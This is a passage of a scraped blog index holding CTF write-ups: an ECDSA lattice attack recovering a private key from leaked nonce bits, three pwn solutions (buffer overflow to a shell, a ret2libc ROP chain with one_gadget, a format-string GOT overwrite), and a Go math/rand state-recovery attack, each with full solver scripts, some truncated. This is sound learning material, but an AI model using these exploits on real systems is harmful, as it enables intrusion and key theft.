2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:2","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Extra notes The solution is unstable, which after testing in the local, I found out that we can only apply our constructed lattice only if the bits length of the $c_2$ is \u003c $63$ bits. So, during the challenge, what I do is simply restart the docker so many times, until the $c_2$ value is \u003c $63$ bits. I believe one of the reason of this unstable result is due to the $K$ value that I set is $2^{56}$. I’m pretty sure that my lattice can be improved so that it can recover the $\\text{nonce}$ even though the $c_2$ bits length is between ${63,64}$ bits. Also in the paper, it is stated that The determinant bounds guarantee that we will find one short lattice vector, but do not guarantee that we will find four short lattice vectors. For that, we rely on the heuristic that the reduced vectors of a random lattice are close to the same length. So maybe, it is expected that we might need to do several attempts to break the given ECDSA system. ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:3","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":"Full Script I use sage to run this script from pwn import * from Crypto.Util.number import * import json from hashlib import sha1 from ecdsa.ecdsa import generator_256, Public_key, Private_key, Signature import binascii def retrieve_file(fname): try: dt = open(fname, 'rb').read() return dt.hex() except: return 'The file does not exist!' class ECDSA: def __init__(self, key=-1): self.G = generator_256 self.n = self.G.order() if key == -1: self.key = randint(1, self.n - 1) else: self.key = key self.pubkey = Public_key(self.G, self.key * self.G) self.privkey = Private_key(self.pubkey, self.key) def sign(self, fname): h = sha1(fname).digest() nonce = randint(1, self.n - 1) sig = self.privkey.sign(bytes_to_long(h), nonce) return {\"r\": hex(sig.r)[2:], \"s\": hex(sig.s)[2:], \"nonce\": hex(nonce)[2:]} def verify(self, fname, r, s): h = bytes_to_long(sha1(fname).digest()) r = int(r, 16) s = int(s, 16) sig = Signature(r, s) if self.pubkey.verifies(h, sig): return retrieve_file(fname) else: return 'Signature is not valid\\n' def list_files(conn): conn.sendlineafter(b'a file\\n', b'{\"option\": \"list\"}') response = json.loads(conn.recvuntil(b'\\n').strip()) return response['files'] def access_file(conn, fname, r, s): payload = json.dumps({ 'option': 'access', 'fname': fname, 'r': r, 's': s, }) conn.sendlineafter(b'a file\\n', payload.encode()) response = conn.recvuntil(b'\\n') return json.loads(response) url = 'localhost:1337' host = url.split(':')[0] port = int(url.split(':')[1]) conn = remote(host, port) files = list_files(conn) q = 115792089210356248762697446949407573529996955224135760342422259061068512044369 # Get first signature with its leaked nonce fname1 = (files[0].split('_')[0] + '_' + files[0].split('_')[1]).encode() h1 = bytes_to_long(sha1(fname1).digest()) r1 = int(files[0].split('_')[2], 16) s1 = int(files[0].split('_')[3], 16) leaked1 = int(files[0].split('_')[4], 16) a1 = leaked1*(2**56) # Get second signature with its leaked nonce fname2 = (files[1].split('_')[0] + '_' + files[1].split('_')[1]).encode() h2 = bytes_to_long(sha1(fname2).digest()) r2 = int(files[1].split('_')[2], 16) s2 = int(files[1].split('_')[3], 16) leaked2 = int(files[1].split('_')[4], 16) a2 = leaked2*(2**56) # Craft our lattice k = 2**56 inv_s1 = int(inverse_mod(s1, q)) inv_r2 = int(inverse_mod(r2, q)) t = (-inv_s1*s2*r1*inv_r2) % q u = (inv_s1*r1*h2*inv_r2 - inv_s1*h1) % q uu = a1 + t*a2 + u m = Matrix([ [k, k*2**200, k*t, k*t*2**192, uu], [0, k*q, 0, 0, 0], [0, 0, k*q, 0, 0], [0, 0, 0, k*q, 0], [0, 0, 0, 0, q], ]) m = m.LLL() # Now, from the reduced basis, we try to solve the equations new_m = [] res = [] for row in m[:-1]: real_row = [] for val in row[:-1]: real_row.append(val / k) new_m.append(real_row) res.append(-row[-1]) new_m = Matrix(new_m) res = vector(res) ans = new_m.solve_right(res) # Now, we can get the nonce k1 = ans[0] + ans[1]*2**200 + a1 k2 = ans[2] + ans[3]*2**192 + a2 print('nonce_1:', hex(k1)) print('nonce_2:', hex(k2)) # From the retrieved nonce, we get the secret (key) secret = ((k1 * s1 - h1) * inverse_mod(r1, q)) % q print('secret:', secret) # Sign 'subject_danbeer' new_ecc = ECDSA(secret) filename = b'subject_danbeer' signature = new_ecc.sign(b'subject_danbeer') # Send its signature to the server resp = access_file(conn, filename.decode(), signature['r'], signature['s']) print('\\nResponse:') print(binascii.unhexlify(resp['data']).decode()) Social Media Follow me on twitter ","date":"May 19, 2022","objectID":"/posts/cyber-apocalypse-ctf-2022/:2:4","tags":["Writeup","htb","CyberApocalypseCTF","RSA","ECDSA","LLL","HNP","crypto","2022"],"title":"Cyber Apocalypse CTF 2022","uri":"/posts/cyber-apocalypse-ctf-2022/"},{"categories":null,"content":" SanDiego CTF is pretty unique because the CTF platform is using Discord. I only have time to look at the pwn challenge, so here’s my writeup for some challenge that I solved Pwn ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:0:0","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Horoscope ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:1:0","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary. Let’s disassemble it: main undefined8 main(void) { char local_38 [48]; puts(\"Welcome to SDCTF\\'s very own text based horoscope\"); puts( \"please put in your birthday and time in the format (month/day/year/time) and we will have you r very own horoscope\" ); fflush(stdout); fgets(local_38,0x140,stdin); processInput(local_38); return 0; } processInput void processInput(char *param_1) { char *__nptr; int local_1c; char *local_18; int local_c; __nptr = strtok(param_1,\"/\"); for (local_1c = 0; local_1c \u003c 4; local_1c = local_1c + 1) { if (local_1c == 0) { local_c = atoi(__nptr); } if (local_1c == 3) { atoi(__nptr); } } switch(local_c) { default: puts(\"thats not a valid date \u003e:-(\"); fflush(stdout); /* WARNING: Subroutine does not return */ exit(1); case 1: local_18 = \"January\"; break; case 2: local_18 = \"February\"; break; case 3: local_18 = \"March\"; break; case 4: local_18 = \"April\"; break; case 5: local_18 = \"May\"; break; case 6: local_18 = \"June\"; break; case 7: local_18 = \"July\"; break; case 8: local_18 = \"August\"; break; case 9: local_18 = \"September\"; break; case 10: local_18 = \"October\"; break; case 0xb: local_18 = \"November\"; break; case 0xc: local_18 = \"December\"; } printf(\"wow, you were born in the month of %s. I think that means you will have a great week! :)\", local_18); fflush(stdout); return; } Looking at the main, there is buffer overflow bug. Looking at the checksec result, there isn’t any canary also: Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) And then we also found a test function which call system('/bin/sh') void test(void) { if (temp == 1) { system(\"/bin/sh\"); } return; } Notes that the if else doesn’t matter, because we can directly use the system line instead of the start of the test function ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:1:1","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Well, simply use the buffer overflow bug to overwrite the main ret to the given system line of code. Also make sure that our buffer overflow payload should follow the processInput validation (which is a date). ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:1:2","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Solution Below is the full solver script to buffer overflow it: from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./horoscope\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=''' b *main+100 ''') else: r = remote(\"horoscope.sdc.tf\", 1337) return r r = conn() system_addr = p64(0x000000000040095f) payload = b'11/11/11' + b'1'*0x30 +system_addr r.sendlineafter(b'horoscope\\n', payload) r.interactive() Run the solver and we will get a shell to read the flag Flag: sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y} ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:1:3","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Secure-Horoscope ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:2:0","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary and dockerfile. Let’s disassemble it first. main int main(int argc,char **argv) { char buf [40]; int i; i = 0; puts(\"We fixed some bugs in our last horoscope, this one should be secure!\\n\"); puts(\"To get started, tell us how you feel\"); fflush(stdout); fgets(buf,0x28,stdin); printf(\"feeling like %s? That\\'s interesting.\",buf); fflush(stdout); for (; i != 2; i = i + 1) { puts( \"please put in your birthday and time in the format (month/day/year/time) and we will have y our very own horoscope\\n\" ); fflush(stdout); getInfo(); puts(\"want to try again?\\n\"); fflush(stdout); } puts(\"too bad, we don\\'t have the resources for that right now \u003e:(\"); fflush(stdout); return 0; } Looking at the main function, it looks like main will call getInfo twice before exit. So far, main doesn’t have any vulns that I could see. Let’s take a look at the getInfo getInfo void getInfo(void) { char info [100]; memset(info,0,100); read(0,info,0x8c); puts(info); puts(\"hm, I\\'ll have to think about what this means. I\\'ll get back to you in 5 business days.\"); fflush(stdout); return; } We can see that there is buffer overflow vuln during read, but we can only overwrite 20-bytes at most after the function saved RBP. Let’s checksec it first Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Okay, no canary! However, 20-bytes are pretty small. To leak a libc function address, AFAIK, we need to have at least 24-bytes (pop_rdi + libc_got + puts_plt) 😢 Looking at the Dockerfile, we can simply build it and get the used libc file for the challenge in the server. ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:2:1","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Exploitation Plan First, with the buffer overflow, we can simply overwrite the return address of getInfo to getInfo again, so that it won’t return to the main. This means the limitation of getInfo in the main (only 2 times to input) is bypassed. Second, through observation via GDB, everytime we overwrite getInfo return address to getInfo again, the new stack RSP address is increased by 8. Look at the below gdb result. During the first time we use getInfo the RSP just before it ret is placed on 0x7fff22cd8448. Notice that starting from the rsp+0x18 is our previous input during filling the how you feel question. After overwrite the ret to getInfo again, notice that the RSP just before it ret is placed on 0x7fff22cd8450 (Increased by 8). And now, our input in getInfo got merged with our previous input in main. Based on above, our input in getInfo will be placed just above our previous input in main (during storing how you feel question). This means that our buffer overflow will be technically increased from 20-bytes only to 60-bytes after we overwrite getInfo ret to getInfo again (20-bytes + input in main size). From the above information, that means we can definitely leak address of any libc function. The plan is to split our ROP chain to leak the libc. The first part will be stored during getInfo, the second part will be stored via main. After leaking the libc, we can simply ret to getInfo again, and then overwrite the return pointer to system. We can use one_gadget to help us get the shell address. ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:2:2","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Solution Okay, so now, we need to craft our ROP chain to leak the libc address. With the help of ROPGadget, we can find address which will do pop rdi; ret. So, my ROP chain would be like this: pop_rdi_ret + puts_got + puts_plt + getInfo So, we put the puts_got to rdi, and then call puts, and then return it back to getInfo. We need to ret it back to getInfo so that we can overwrite its return pointer with the system address. We split it into two parts, pop_rdi_ret + puts_got and puts_plt + getInfo. Put the second part in main, and put the first part into getInfo. First, put up the second part in main, and then overwrite the getInfo return pointer with getInfo again first. puts_plt = exe.plt['puts'] puts_got = exe.got['puts'] pop_rdi = 0x0000000000400873 # pop rdi; ret getInfo = exe.symbols['getInfo'] r = conn() r.sendlineafter(b'feel\\n', p64(puts_plt)+p64(getInfo)) # Ret to getInfo again print() print(f'Ret2getInfo again') payload = b'a'*0x78 + p64(getInfo) r.sendafter(b'horoscope\\n\\n', payload) r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() Now, based on our observation with GDB, when we overflow the next getInfo, it will placed inside the program stack just above our input in the main. Now, put the first part to the getInfo # Pop puts_got to rdi, ret to puts_plt (First input, got this via observation in GDB) print() print(f'Time to leak libc base...') payload = b'a'*0x78 + p64(pop_rdi) + p64(puts_got) # Because it got merged with our main input, our ROP will continue to puts_plt + getInfo r.send(payload) r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() Honestly, on my local, after executing above script, I am able to get the leaked puts libc address. However, somehow in the server, I couldn’t do that. Instead, I need to send any string first before the server return the leaked puts libc. So, I decided to send another payload which will overwrite getInfo to getInfo again. # I don't know but somehow, in the server, it didn't return the puts_plt immediately # Somehow, I need to send something first before getting the leaked puts address # So, I decided to send another payload to return to getInfo again r.send(b'a'*0x78 + p64(getInfo)) out = r.recvuntil(b'\\n').strip() # Finally got the leaked libc r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() leaked_puts = u64(out.ljust(8, b'\\x00')) print(f'leaked_puts : {hex(leaked_puts)}') libc_base = leaked_puts - libc.symbols['puts'] libc.address = libc_base print(f'libc base : {hex(libc_base)}') Finally, after we got the libc base address, we can simply use one_gadget to gain the shell address (with constraints). Now, for the last step, overwrite the getInfo return pointer with the shell. one_gadget = 0x4f302 # [rsp+0x40] == NULL payload = b'a'*0x78 + p64(libc_base+one_gadget) r.send(payload) r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() r.interactive() And we got the shell 😃 Below is the full solver script: from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./secureHoroscope_patched\") libc = ELF(\"./libc-2.27.so\") ld = ELF(\"./ld-2.27.so\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path], env={}) if args.PLT_DEBUG: gdb.attach(r, gdbscript=''' b *getInfo+93 ''') else: r = remote(\"sechoroscope.sdc.tf\", 1337) return r puts_plt = exe.plt['puts'] puts_got = exe.got['puts'] one_gadget = 0x4f302 # [rsp+0x40] == NULL pop_rdi = 0x0000000000400873 # pop rdi; ret getInfo = exe.symbols['getInfo'] r = conn() r.sendlineafter(b'feel\\n', p64(puts_plt)+p64(getInfo)) # Ret to getInfo again print() print(f'Ret2getInfo again') payload = b'a'*0x78 + p64(getInfo) r.sendafter(b'horoscope\\n\\n', payload) r.recvuntil(b'\\n').strip() r.recvuntil(b'\\n').strip() # Pop puts_got to rdi, ret to puts_plt (First input, got this via observation in GDB) print() print(f'Time to leak libc base...') payload = b'a'*0x78 + p64(pop_rdi) + p64(puts_got) r.send(payloa","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:2:3","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Oil Spill ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:3:0","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary and Dockerfile. Let’s disassemble the binary first undefined8 main(undefined8 param_1,undefined8 param_2) { undefined8 in_R9; long in_FS_OFFSET; char local_148 [312]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); printf(\"%p, %p, %p, %p\\n\",puts,printf,local_148,temp,in_R9,param_2); puts(\"Oh no! We spilled oil everywhere and its making everything dirty\"); puts(\"do you have any ideas of what we can use to clean it?\"); fflush(stdout); fgets(local_148,300,stdin); printf(local_148); puts(x); fflush(stdout); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; } If we look at the code, seems like the code already leaked the libc of puts and printf. Another thing that we could notice is, there is a format string bug in below code fgets(local_148,300,stdin); printf(local_148); Also another thing to look is the puts(x) line. Checking on Ghidra,x is a string located in .data Looking at the given Dockerfile, we can simply build it, and then take the libc file of the binary. ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:3:1","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Based on the initial analysis, what we already have are: Libc file (from Dockerfile) Libc base during the binary execution (Due to the leak) Format string bug Note that we can overwrite value with format string bug via %n. For example, if we do %20$n, then it will overwrite the 20th element with how many characters have we printed. Based on those, my plan is to overwrite the puts to system, and x to /bin/sh\\x00. So that after reading our payload, when the binary call puts(x), they will call system('/bin/sh\\x00') instead. ","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:3:2","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":"Solution So, in order to execute the plan, what I do is: Overwrite x value byte per byte (via %hhn) Overwrite puts last byte (via %hhn) Overwrite puts second and third last byte (via %hn) First, let’s try to get the libc base from the leaked: r = conn() outs = r.recvuntil(b'\\n').strip().split(b',') leaked_puts = int(outs[0], 16) libc_base = leaked_puts - libc.symbols['puts'] libc.address = libc_base print(f'Leaked Libc base: {hex(libc_base)}') system_addr = libc.symbols[\"system\"] print(f'system@libc: {hex(system_addr)}') puts_got = exe.got[\"puts\"] # This will be overwritten with system print(f'puts@got : {hex(puts_got)}') x_addr = exe.symbols[\"x\"] # This will be overwritten with /bin/sh\\x00 print(f'x : {hex(x_addr)}') After executing the above codes, we will already have: The puts got location The x location The system address in libc Now, let’s craft our payload. Below is the payload that I use fmt_str = b'' fmt_str += f'%21$hhn'.encode() # Overwrite lsb of x to \\x00 fmt_str += f'%{0x20}c%22$hhn'.encode() # Overwrite lsb of puts to lsb of system # Overwrite x to '/bin/sh' fmt_str += f'%{0x2f-0x20}c%23$hhn'.encode() fmt_str += f'%24$hhn'.encode() fmt_str += f'%{0x62-0x2f}c%25$hhn'.encode() fmt_str += f'%{0x68-0x62}c%26$hhn'.encode() fmt_str += f'%{0x69-0x68}c%27$hhn'.encode() fmt_str += f'%{0x6e-0x69}c%28$hhn'.encode() fmt_str += f'%{0x73-0x6e}c%29$hhn'.encode() # Overwrite 2nd and 3rd byte of puts to system second_third_byte_system = u64(p64(system_addr)[1:3].ljust(8, b'\\x00')) fmt_str += f'%{second_third_byte_system-0x73}c%30$hn'.encode() fmt_str = pad(fmt_str, 8) # This will be used as the address that we will overwrite # For x_addr, we will overwrite it per byte # For puts, we will: # - Overwrite the last byte first (0x20) # - Overwrite the second and third byte together addr = b'' addr += p64(x_addr+7) + p64(puts_got) + p64(x_addr) addr += p64(x_addr+4) + p64(x_addr+1) + p64(x_addr + 6) addr += p64(x_addr + 2) + p64(x_addr + 3) + p64(x_addr + 5) addr += p64(puts_got+1) payload = fmt_str + addr So, %hhn will overwrite 1 byte of the targeted element with the total character that we have printed, %hn will overwrite 2 bytes of the targeted element, and %c will print space with total as the given number (For example, %100c will print 100 spaces). And %10c%5$n means we overwrite the fifth element with 0xA (10). Notes that we actually need to carefully craft our payload to make sure the payload is ordered by the byte, because any character that we print to overwrite the current element, will be counted also during overwritten the next element. For example, if we already print 0x20, and then we want to overwrite another element, we can only overwrite it with size larger than 0x20. Let say we want to overwrite it with 0x2f, then we only need to print 0xf more. This means that we need to sort our payload to overwrite the address sorted by the byte from the smallest to the largest, because we can’t decrease the total count of the characters that we have printed. The above payload already fulfilled this increasing condition. Below is the result after we send the crafted payload to the server. We got a shell and we can read the flag This is the full solver script from Crypto.Util.Padding import pad from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./OilSpill_patched\") libc = ELF(\"./libc-2.27.so\") ld = ELF(\"./ld-2.27.so\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=''' b *main+186 ''') else: r = remote(\"oil.sdc.tf\", 1337) return r r = conn() outs = r.recvuntil(b'\\n').strip().split(b',') print(f'Outs: {outs}') leaked_puts = int(outs[0], 16) libc_base = leaked_puts - libc.symbols['puts'] libc.address = libc_base print(f'Leaked Libc base: {hex(libc_base)}') system_addr = libc.symbols[\"system\"] print(f'system@libc: {hex(system_addr)}') puts_got = exe.got[\"puts\"] # This will be overwr","date":"May 09, 2022","objectID":"/posts/sandiego-ctf-2022/:3:3","tags":["Writeup","SanDiego CTF","heap","pwn","format string","buffer overflow","2022"],"title":"SanDiego CTF 2022","uri":"/posts/sandiego-ctf-2022/"},{"categories":null,"content":" AngstromCTF 2022 On this CTF, I managed to solve only one problem as I don’t have much time to work on it. Here’s my writeup for that problem. Crypto ","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:0:0","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":"Prophet ","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:1:0","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a source code like below package main import ( \"encoding/binary\" \"fmt\" \"math/rand\" ) func main() { flag := \"actf{REDACTEDREDACTEDREDACTED!!}\" rand.Seed(12345) // the actual seed is not 12345 // drastically slow down naive brute force for i := 0; i \u003c 100000; i += 1 { rand.Uint64() } for i := 0; i \u003c 4; i += 1 { fmt.Printf(\"flag chunk: %d\\n\", binary.LittleEndian.Uint64([]byte(flag)[i*8:i*8+8])^rand.Uint64()) } gap := 0 for i := 0; i \u003c 607; i += 1 { fmt.Println(rand.Uint64()) for j := 0; j \u003c gap; j += 1 { rand.Uint64() } gap = (gap + 1) % 13 } } Skimming through the code, what this code do is basically: Call rand.Uint64() for 100000 times Call rand.Uint64() for 4 times. Each value will be xored with the flag chunk Print value of the rand.Uint64() for 607 times, but there will be a gap between each print (So we don’t get the full complete sequence of it). ","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:1:1","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":"Attack Plan Seems like we need to attack the golang math/rand PRNG. So, we need to dive into the math/rand source code first to see how golang implements it. Below is the relevant source code: go/rand.go // A Source represents a source of uniformly-distributed // pseudo-random int64 values in the range [0, 1\u003c\u003c63). type Source interface { Int63() int64 Seed(seed int64) } // A Source64 is a Source that can also generate // uniformly-distributed pseudo-random uint64 values in // the range [0, 1\u003c\u003c64) directly. // If a Rand r's underlying Source s implements Source64, // then r.Uint64 returns the result of one call to s.Uint64 // instead of making two calls to s.Int63. type Source64 interface { Source Uint64() uint64 } // A Rand is a source of random numbers. type Rand struct { src Source s64 Source64 // non-nil if src is source64 // readVal contains remainder of 63-bit integer used for bytes // generation during most recent Read call. // It is saved so next Read call can start where the previous // one finished. readVal int64 // readPos indicates the number of low-order bytes of readVal // that are still valid. readPos int8 } // Seed uses the provided seed value to initialize the generator to a deterministic state. // Seed should not be called concurrently with any other Rand method. func (r *Rand) Seed(seed int64) { if lk, ok := r.src.(*lockedSource); ok { lk.seedPos(seed, \u0026r.readPos) return } r.src.Seed(seed) r.readPos = 0 } // Uint64 returns a pseudo-random 64-bit value as a uint64. func (r *Rand) Uint64() uint64 { if r.s64 != nil { return r.s64.Uint64() } return uint64(r.Int63())\u003e\u003e31 | uint64(r.Int63())\u003c\u003c32 } And below is the rngSource which implements Source interface go/rng.go const ( rngLen = 607 rngTap = 273 rngMax = 1 \u003c\u003c 63 rngMask = rngMax - 1 int32max = (1 \u003c\u003c 31) - 1 ) type rngSource struct { tap int // index into vec feed int // index into vec vec [rngLen]int64 // current feedback register } // Seed uses the provided seed value to initialize the generator to a deterministic state. func (rng *rngSource) Seed(seed int64) { rng.tap = 0 rng.feed = rngLen - rngTap seed = seed % int32max if seed \u003c 0 { seed += int32max } if seed == 0 { seed = 89482311 } x := int32(seed) for i := -20; i \u003c rngLen; i++ { x = seedrand(x) if i \u003e= 0 { var u int64 u = int64(x) \u003c\u003c 40 x = seedrand(x) u ^= int64(x) \u003c\u003c 20 x = seedrand(x) u ^= int64(x) u ^= rngCooked[i] rng.vec[i] = u } } } // Uint64 returns a non-negative pseudo-random 64-bit integer as an uint64. func (rng *rngSource) Uint64() uint64 { rng.tap-- if rng.tap \u003c 0 { rng.tap += rngLen } rng.feed-- if rng.feed \u003c 0 { rng.feed += rngLen } x := rng.vec[rng.feed] + rng.vec[rng.tap] rng.vec[rng.feed] = x return uint64(x) } So, basically, the way golang RNG works are: Seed will determine the initial value of vec Set the initial value of tap and feed (tap=0, feed=rngLen-rngTap=334) To generate a random number, it will: Decrement tap by 1 Decrement feed by 1 Calculate x = (vec[feed]+vec[tap]) % 2**64 Set vec[feed] = x Return vec[feed] Notes that the tap and feed is circular, so it will point to the vec last element if it got decremented when point to the vec first element. So basically, the way it generated a random number is through linear equations. Now notice this given code on the problem. gap := 0 for i := 0; i \u003c 607; i += 1 { fmt.Println(rand.Uint64()) for j := 0; j \u003c gap; j += 1 { rand.Uint64() } gap = (gap + 1) % 13 } The given problem gave us some leaked of the generated random value, but it has a gap, so we don’t know the full sequence numbers of it. But, the plan is, from the given sequences, we must need to somehow reconstruct the vec internal state. ","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:1:2","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":"Solution Now, let see the given code flag := \"actf{REDACTEDREDACTEDREDACTED!!}\" rand.Seed(12345) // the actual seed is not 12345 // drastically slow down naive brute force for i := 0; i \u003c 100000; i += 1 { rand.Uint64() } for i := 0; i \u003c 4; i += 1 { fmt.Printf(\"flag chunk: %d\\n\", binary.LittleEndian.Uint64([]byte(flag)[i*8:i*8+8])^rand.Uint64()) } Actually, we can ignore the 100000 loops because we don’t need that at all. What we need is only the internal state just before the call rand.Uint64() during xoring the flag chunk, so we don’t care the internal state of vec before 100000 calls. From observation, it is just linear equations, and it seems like even though what we got is only partial sequences, I think it shold be enough to recover needed internal states to generate the random number those are xored with the flag chunks. Because I’m too lazy, well let’s simply try to solve it with the help of z3 😃. Turn out, z3 is only able to find some internal states of the vec, but this is enough to generate the 4 random values those are xored with the flag chunks. Below is the full solver script from Crypto.Util.number import * from z3 import * leaked = [1967981989159506896, 12417576839900903143, 5391827788107581754, 9211837354618349619, 11911979448172444251, 436461377053033951, 8394439408169944148, 9103763829763273513, 7101121394772592963, 18180164424805091773, 10980218005670728650, 3592195252851566282, 15982088259081365278, 18366993356901645139, 16470043187318505301, 12529639613890366320, 5405453295559550962, 3219566894479483465, 16987169033331910230, 9344236955639961560, 3745615208872438517, 3388187019357417407, 17198114806622348859, 9334174653951229381, 1009948000446937143, 14650385610612467309, 14912852548935159537, 8230750145803377492, 13210874570097825431, 4261899336407377866, 2573134042538913249, 10562921983129619234, 4481733723106553150, 6693876041704064709, 13772536884257081061, 4814655535784567940, 17117043381738664412, 10014777550587990992, 7013436321029132294, 953436847296933558, 13864297711807309149, 11312345922389074726, 2199867878612078091, 8402220611296899976, 10378165238796511161, 16078363467890630054, 7098501269083835059, 1681679444219081187, 17235013401211119472, 2203917752371077442, 9217070900827478302, 10058277698897632667, 15972660907870375806, 6622838346930090221, 12586537260105593109, 6433719167686925168, 3032065173778278418, 9743104590135308267, 7391368162387036788, 10725912781903875779, 9846554056484719855, 12343982921622455581, 36206366241642941, 11813694384750487006, 5494944593056217372, 17617075954936948791, 15958686524489577932, 11727447540781267578, 13380151820153190493, 9349098470649357156, 13803047902546235975, 17286479261703485395, 14722281154768715543, 12612473994461271801, 14312822945784769203, 15609063854644643395, 14708036210562969600, 13796313732450064136, 10307023727568972101, 17513680648877824019, 16702438782110391465, 3652001414219721007, 5265625636739631457, 10654632704447374504, 7511078814006349210, 9140982706528528010, 16223838721279393322, 10420524606533750516, 16701377323767306114, 3750804369080437426, 1274885552917066026, 4230518916834636384, 6690624599507792675, 15478451784117638719, 13534840562459518131, 12163976775461276142, 9476524941230848424, 1443362190438042863, 1456911544696158525, 13438749309336286137, 13766436007254005985, 8432370224361500748, 3203865476118736526, 4420206307832455609, 10496653657337759511, 2775211754574419515, 16696355141624962972, 16768338839510607900, 10202318454385533892, 12554418635459033218, 1708421080877496043, 11341735535211029325, 13622421994908208944, 16469847339176897411, 10935449642259488944, 5989762449076810195, 16678533334885732063, 9391936203669602898, 15958497913540135719, 15152164795107255721, 17424538298476802068, 13476846617758916522, 15469288240231942444, 1042058457773191313, 1437682614378048888, 7791872198157832698, 3337812416348112405, 1784790255299050697, 17002639445141763699, 12767980465486129482, 17612162068890083773, 16407551756979473","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:1:3","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 